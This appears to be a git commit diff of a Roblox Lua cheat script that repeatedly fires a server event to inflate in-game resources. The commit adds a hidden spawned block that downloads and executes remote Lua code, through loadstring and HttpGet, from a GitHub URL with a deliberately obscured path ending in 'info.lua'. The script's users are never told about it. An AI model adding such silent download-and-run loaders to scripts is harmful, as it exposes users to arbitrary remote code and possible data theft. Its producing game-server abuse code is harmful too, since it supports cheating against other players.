3d663762dca6612d1a893e045922a0a305a95321
bjalalsjzbslalqoqueeyhskaambpqo <cuentaargentina19@gmail.com>
2024-08-05 13:46:35 -0300

    Update 18751279825.lua

--- 18751279825.lua
+++ 18751279825.lua
@@ -1,3 +1,6 @@
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
+  end)
 for i = 1,15 do
 game:GetService("ReplicatedStorage"):WaitForChild("UpdateResource"):FireServer(1000)
 end
